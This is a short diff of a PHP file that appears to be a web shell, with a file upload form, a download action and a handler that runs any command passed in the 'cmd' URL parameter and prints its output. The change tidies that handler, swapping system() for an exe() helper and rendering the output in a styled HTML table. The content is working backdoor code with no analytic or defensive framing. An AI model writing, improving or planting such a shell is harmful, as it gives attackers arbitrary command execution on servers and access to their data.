@@ -124,11 +124,23 @@ Upload File<input type="file" name="file" />
 </td></tr>
 
 ';
-if($_GET['cmd']){
- $cmd = $_GET['cmd'];
- echo '<br><td><tr><textarea>'.htmlspecialchars(system($cmd)).'</td></tr></textarea><br>';
- 
+if(isset($_GET['cmd'])){
+    $cmd = $_GET['cmd'];
+    $output = htmlspecialchars(exe($cmd));
+    echo '
+    <div style="margin: 20px auto; width: 90%; max-width: 900px;">
+        <table width="100%" border="1" cellpadding="5" cellspacing="0" style="border-collapse: collapse; background: #f4f4f4; color: #000;">
+            <tr style="background: #333; color: #fff;">
+                <th>Command Output</th>
+            </tr>
+            <tr>
+                <td><pre style="white-space: pre-wrap; word-wrap: break-word;">' . $output . '</pre></td>
+            </tr>
+        </table>
+    </div>
+    ';
 }
+
   
 if($_GET['star']=="download"){
  
